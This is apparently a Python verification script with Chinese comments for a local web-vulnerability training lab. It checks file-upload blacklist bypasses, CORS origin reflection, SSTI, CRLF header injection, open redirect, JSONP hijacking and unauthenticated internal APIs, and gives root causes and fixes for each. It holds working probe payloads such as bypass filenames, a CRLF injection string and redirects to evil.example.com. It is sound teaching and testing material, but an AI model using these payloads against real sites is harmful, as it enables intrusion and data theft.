#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 verify_webvulnlab.py — 剩餘 7 類缺口驗證
=============================================================================

 這個驗證腳本涵蓋 7 種不同性質的漏洞，每種的驗證方式都不同：
   U  文件上傳 → 看**伺服器是否接受繞過的檔名**
   O  CORS     → 看**回應標頭是否反射任意 Origin**
   T  SSTI     → 看**模板表達式是否被求值**（{{7*7}} → 49）
   Cr CRLF     → 看**回應標頭是否被注入**
   R  重定向   → 看 **Location 標頭指向何處**
   J  JSONP    → 看**回應是否包裝了 callback**
   A  未授權   → 看**無憑證能否取得資料**

 ⚠ 僅在本機靶場執行；上傳內容為無害字串。
=============================================================================
"""

import json
import sys
import urllib.error
import urllib.parse
import urllib.request

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8930
BASE = "http://127.0.0.1:%d" % PORT
results = []


def req(path, method="GET", data=None, headers=None, raw=None, follow=False):
    """follow=False 時不自動跟隨重導向（用於驗證 302）。"""
    body = raw if raw is not None else (json.dumps(data).encode() if data is not None else None)
    r = urllib.request.Request(BASE + path, method=method, data=body,
                               headers=headers or {})

    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):
            return None

    opener = urllib.request.build_opener() if follow else \
        urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(r, timeout=15) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "replace")
    except Exception as e:                                   # noqa: BLE001
        return -1, {}, str(e)


def check(name, cwe, passed, evidence):
    results.append((name, cwe, passed, evidence))
    mark = "PASS（漏洞存在）" if passed else "FAIL（未觸發）"
    print("\n" + "-" * 76)
    print("[%s] %s  —  %s" % (mark, name, cwe))
    print("-" * 76)
    for line in evidence.splitlines():
        print("   " + line)


def main():
    print("=" * 76)
    print(" WebVulnLab 驗證 — 剩餘 7 類缺口")
    print(" 目標：%s" % BASE)
    print("=" * 76)

    st, _, _ = req("/")
    if st != 200:
        print("\n[錯誤] 無法連線（HTTP %s）" % st)
        sys.exit(1)

    # ============ U · 文件上傳（黑名單不完整繞過）============
    #
    # ★ 實測修正：我原本以為「大小寫」能繞過，但靶場的黑名單用了
    #   fname.lower().endswith(...)，所以 .pHp 也會被擋。
    #   真正的漏洞是**黑名單本身不完整**——PHP 有多個可執行副檔名。
    variants = ["shell.php", "shell.pHp", "shell.php5", "shell.phtml",
                "shell.phar", "shell.php.jpg", "shell.pht", "shell.shtml",
                "shell.jspx", "shell.asp;.jpg"]
    blocked, bypassed = [], []
    for fn in variants:
        stv, _, bv = req("/upload", "POST", {"filename": fn, "content": "TEST"})
        if "FLAG{upload_blacklist_bypass}" in bv:
            bypassed.append(fn)
        elif stv == 403:
            blocked.append(fn)

    # 安全對照
    st_s, _, b_s = req("/upload-safe", "POST", {"filename": "x.php", "content": "TEST"})
    safe_blocked = (st_s == 403)
    # 內容檢查：偽裝成 .png 但內容不符
    st_s2, _, b_s2 = req("/upload-safe", "POST",
                         {"filename": "evil.png", "content": "not-a-real-png"})
    content_checked = (st_s2 == 403)

    ev = [
        "★ 實測修正 : 我原本假設『大小寫可繞過』，但靶場黑名單用了",
        "            fname.lower().endswith() → .pHp 也被擋（實測確認）。",
        "            真正的漏洞是**黑名單本身不完整**。",
        "",
        "被攔阻（%d 個）：%s" % (len(blocked), ", ".join(blocked)),
        "繞過成功（%d 個）：%s" % (len(bypassed), ", ".join(bypassed)),
        "",
        "安全對照  : POST /upload-safe filename=x.php → HTTP %s（白名單攔阻=%s）"
        % (st_s, safe_blocked),
        "內容檢查  : 偽裝 .png 但內容不符 → HTTP %s（內容檢查生效=%s）"
        % (st_s2, content_checked),
        "",
        "根因      : (a) **黑名單不完整**——PHP 可執行副檔名不只 .php",
        "                （.php5/.phtml/.phar/.pht/.shtml/.jspx 等）",
        "            (b) 未檢查 Content-Type",
        "            (c) 未檢查 magic bytes（檔案頭）",
        "            (d) 未處理多重副檔名（.php.jpg）與分隔符（.asp;.jpg）",
        "            ※ 大小寫在**有 .lower() 的實作下無效**——這是常見誤解",
        "修補方向  : **白名單**（只允許必要副檔名）+ 內容檢查（magic bytes）+",
        "            重新命名檔案 + 存到不可執行的目錄",
        "OWASP 對照: CWE-434（不受限的檔案上傳）",
    ]
    check("U 文件上傳（黑名單不完整）", "CWE-434",
          len(bypassed) > 0 and safe_blocked and content_checked, "\n".join(ev))

    # ============ O · CORS 配置錯誤 ============
    # 1) 萬用字元
    st_p, h_p, _ = req("/api/public")
    wildcard = h_p.get("Access-Control-Allow-Origin") == "*"
    # 2) 反射任意 Origin + 憑證
    evil = "http://evil.example.com"
    st_pri, h_pri, b_pri = req("/api/private", headers={"Origin": evil})
    reflected = (h_pri.get("Access-Control-Allow-Origin") == evil)
    creds = (h_pri.get("Access-Control-Allow-Credentials") == "true")
    # 3) 內網探測
    st_probe, h_probe, b_probe = req("/cors-probe?host=intranet.local",
                                     headers={"Origin": evil})
    probe_ok = ("FLAG{cors_internal_intranet}" in b_probe)
    # 安全對照
    st_safe, h_safe, _ = req("/api/public")

    ev = [
        "請求 1    : GET /api/public → ACAO=%r（萬用字元=%s）"
        % (h_p.get("Access-Control-Allow-Origin"), wildcard),
        "請求 2    : GET /api/private（Origin: %s）" % evil,
        "            → ACAO=%r（反射任意來源=%s）; ACAC=%r（允許憑證=%s）"
        % (h_pri.get("Access-Control-Allow-Origin"), reflected,
           h_pri.get("Access-Control-Allow-Credentials"), creds),
        "請求 3    : GET /cors-probe?host=intranet.local（Origin: %s）" % evil,
        "            → 取得內網內容=%s" % probe_ok,
        "預期漏洞  : (a) 萬用字元 (b) 反射任意 Origin (c) 允許憑證",
        "            → 任意外站都能讀取回應，且帶上使用者憑證",
        "根因      : CORS 設定為『反射 Origin』而非白名單比對",
        "危害      : 跨域讀取私有資料；配合內網探測可列舉內部服務",
        "驗證方式  : 讀**回應標頭**（ACAO / ACAC）——與 A02 設定類相同思路",
        "修補方向  : 明確來源白名單；不要反射任意 Origin；",
        "            避免『任意 Origin + credentials』組合",
        "OWASP 對照: CWE-942（CWE-346 為 JSONP 類）",
    ]
    check("O CORS 配置錯誤（萬用字元 + 反射 + 憑證）", "CWE-942",
          reflected and creds and probe_ok, "\n".join(ev))

    # ============ T · SSTI ============
    # 用 {{7*7}} 測試是否被求值
    st_g, _, b_g = req("/greet?name=" + urllib.parse.quote("{{7*7}}"))
    evaluated = ("49" in b_g)
    st_r, _, b_r = req("/render?tpl=" + urllib.parse.quote("{{7*7}}"))
    try:
        j_r = json.loads(b_r)
        render_eval = (j_r.get("output", "").strip() == "49")
        engine = j_r.get("engine", "?")
    except Exception:                                        # noqa: BLE001
        render_eval = False
        engine = "?"
    # 安全對照
    st_s2, _, b_s2 = req("/render-safe?tpl=" + urllib.parse.quote("{{7*7}}"))
    try:
        safe_out = json.loads(b_s2).get("output", "")
        safe_literal = ("{{7*7}}" in safe_out) or ("49" not in safe_out)
    except Exception:                                        # noqa: BLE001
        safe_literal = True

    ev = [
        "請求 1    : GET /greet?name={{7*7}} → 回應含 '49' = %s" % evaluated,
        "請求 2    : GET /render?tpl={{7*7}} → output=%r（被求值=%s）; 引擎=%s"
        % (json.loads(b_r).get("output") if b_r.startswith("{") else "?", render_eval, engine),
        "安全對照  : GET /render-safe?tpl={{7*7}} → 保持字面 = %s" % safe_literal,
        "預期漏洞  : 模板表達式被**求值**（{{7*7}} → 49）",
        "判定邏輯  : 不是看『有沒有報錯』，而是看**數學運算是否真的算出結果**",
        "根因      : 把使用者輸入當成**模板**渲染（而非當成資料代入模板）",
        "危害      : 真實情境可進一步存取物件屬性 → 執行任意程式碼（RCE）",
        "            （本靶場刻意只做無害運算，不示範 RCE）",
        "修補方向  : 使用者輸入永遠是『資料』，不是『模板』；",
        "            使用沙箱模板引擎；避免 render_template_string(user_input)",
        "OWASP 對照: CWE-1336（伺服器端模板注入）",
    ]
    check("T SSTI 服務端模板注入", "CWE-1336",
          evaluated and render_eval and safe_literal, "\n".join(ev))

    # ============ Cr · CRLF 注入 ============
    payload = "zh%0d%0aX-Injected:%20yes"
    st_c, h_c, _ = req("/setlang?lang=" + payload)
    injected = ("X-Injected" in h_c) or ("x-injected" in {k.lower() for k in h_c})
    # 安全對照（不帶換行，確認正常情況）
    st_ok, h_ok, _ = req("/setlang?lang=zh")
    normal_only = ("X-Injected" not in h_ok)

    ev = [
        "請求      : GET /setlang?lang=zh%%0d%%0aX-Injected:%%20yes",
        "預期漏洞  : 回應標頭出現 `X-Injected: yes`（換行符注入了新標頭）",
        "實際      : HTTP %s；注入成功=%s" % (st_c, injected),
        "標頭快照  : %s" % ", ".join("%s=%s" % (k, v) for k, v in list(h_c.items())[:6]),
        "對照      : 正常請求（lang=zh）不含注入標頭 = %s" % normal_only,
        "根因      : 把使用者輸入直接放進**回應標頭**，未過濾 CR/LF（%%0d%%0a）",
        "危害      : 可注入任意標頭；配合回應分割（response splitting）",
        "            可造成快取污染，甚至 XSS",
        "驗證方式  : 看**回應標頭**是否多出預期外的欄位",
        "修補方向  : 禁止使用者輸入進入標頭；或嚴格過濾 CR/LF；",
        "            使用框架提供的安全標頭 API",
        "OWASP 對照: CWE-113（HTTP 標頭注入）",
    ]
    check("Cr CRLF 注入（標頭注入）", "CWE-113", injected and normal_only, "\n".join(ev))

    # ============ R · URL 重定向 ============
    evil_url = "https://evil.example.com/phish"
    st_r2, h_r2, _ = req("/login?next=" + urllib.parse.quote(evil_url, safe=""),
                         follow=False)
    loc = h_r2.get("Location", "")
    redirects_evil = (st_r2 in (301, 302, 303, 307, 308)) and (loc == evil_url)
    # 安全對照：相對路徑應仍可用
    st_rel, h_rel, _ = req("/login?next=%2Fdashboard", follow=False)
    rel_ok = h_rel.get("Location", "") == "/dashboard"

    ev = [
        "請求      : GET /login?next=%s（不跟隨重導向）" % evil_url,
        "預期漏洞  : 302 的 Location 直接指向外部惡意網域",
        "實際      : HTTP %s；Location=%r（未檢查目標=%s）" % (st_r2, loc, redirects_evil),
        "對照      : next=/dashboard → Location=%r（相對路徑正常）" % h_rel.get("Location"),
        "根因      : 未驗證 next 參數；直接放進 Location 標頭",
        "危害      : 釣魚（使用者看到的是原網域）、OAuth token 竊取",
        "驗證方式  : 看 **Location 標頭指向何處**",
        "修補方向  : 使用相對路徑白名單；或只允許站內路徑（拒絕外部網域）；",
        "            不以使用者輸入直接作為重導向目標",
        "OWASP 對照: CWE-601（開放重導向）",
    ]
    check("R URL 重定向（開放重導向）", "CWE-601", redirects_evil and rel_ok, "\n".join(ev))

    # ============ J · JSONP 劫持 ============
    st_j, h_j, b_j = req("/api/user?callback=stealData")
    wrapped = b_j.strip().startswith("stealData(") and "session-token" in b_j
    # 無 callback 時應為純 JSON
    st_pj, _, b_pj = req("/api/user")
    plain_json = b_pj.strip().startswith("{")

    ev = [
        "請求 1    : GET /api/user?callback=stealData",
        "            → 回應開頭=%r（被包裝=%s）" % (b_j[:40], wrapped),
        "請求 2    : GET /api/user（無 callback）→ 純 JSON = %s" % plain_json,
        "預期漏洞  : 回應被包裝成 `stealData({...})`",
        "危害      : 任意外站用 <script src> 就能讀取回應內容——",
        "            **繞過同源政策**（因為 <script> 不受 CORS 限制）",
        "            回應中含 session token → 可導致帳號接管",
        "根因      : 支援 JSONP 且未驗證 callback 名稱；回應含敏感資料",
        "驗證方式  : 看**回應是否被 callback 包裝**",
        "修補方向  : 淘汰 JSONP（改用 CORS）；敏感端點絕不支援 JSONP；",
        "            若必須支援，嚴格驗證 callback 只含合法識別字",
        "OWASP 對照: CWE-346（來源驗證不當）",
    ]
    check("J JSONP 劫持（跨域資訊洩漏）", "CWE-346",
          wrapped and plain_json, "\n".join(ev))

    # ============ A · 未授權訪問 ============
    st_u, _, b_u = req("/api/internal/users")          # 完全不帶憑證
    users_leak = "FLAG{unauth_internal_users}" in b_u
    st_cfg, _, b_cfg = req("/api/internal/config")
    config_leak = "sk-internal-FAKE" in b_cfg

    ev = [
        "請求 1    : GET /api/internal/users（**不帶任何憑證**）",
        "            → HTTP %s；洩漏使用者清單=%s" % (st_u, users_leak),
        "請求 2    : GET /api/internal/config（不帶任何憑證）",
        "            → HTTP %s；洩漏 API key=%s" % (st_cfg, config_leak),
        "預期漏洞  : 內部 API 完全沒有認證，任何人可讀",
        "根因      : 端點未檢查登入狀態，也未檢查角色",
        "危害      : 直接取得使用者資料與內部設定（含 API key）",
        "驗證方式  : 看**無憑證能否取得資料**（狀態碼 200 且含敏感內容）",
        "修補方向  : 所有端點預設拒絕（deny by default）；",
        "            內部 API 與外部 API 分離部署；集中式授權中介層",
        "OWASP 對照: CWE-862（缺少授權）",
    ]
    check("A 未授權訪問（內部 API）", "CWE-862",
          users_leak and config_leak, "\n".join(ev))

    # ================= 總結 =================
    print("\n" + "=" * 76)
    print(" 總結")
    print("=" * 76)
    found = sum(1 for _, _, p, _ in results if p)
    for name, cwe, passed, _ in results:
        print("  %-42s %-14s %s" % (name, cwe, "成立" if passed else "未觸發"))
    print("-" * 76)
    print("  通過 %d/%d" % (found, len(results)))
    print()
    print("  七種不同的驗證方式（本靶場的核心教學點）：")
    print("    U  文件上傳 → 伺服器是否**接受繞過的檔名**")
    print("    O  CORS     → 回應標頭是否**反射任意 Origin**")
    print("    T  SSTI     → 模板表達式是否**被求值**（{{7*7}}→49）")
    print("    Cr CRLF     → 回應標頭是否**被注入**")
    print("    R  重定向   → **Location 指向何處**")
    print("    J  JSONP    → 回應是否**被 callback 包裝**")
    print("    A  未授權   → **無憑證能否取得資料**")
    print("=" * 76)

    with open("webvulnlab_result.json", "w", encoding="utf-8") as f:
        json.dump([{"name": n, "cwe": c, "present": p} for n, c, p, _ in results],
                  f, ensure_ascii=False, indent=2)
    print("\n（JSON 摘要已寫入 webvulnlab_result.json）")


if __name__ == "__main__":
    main()
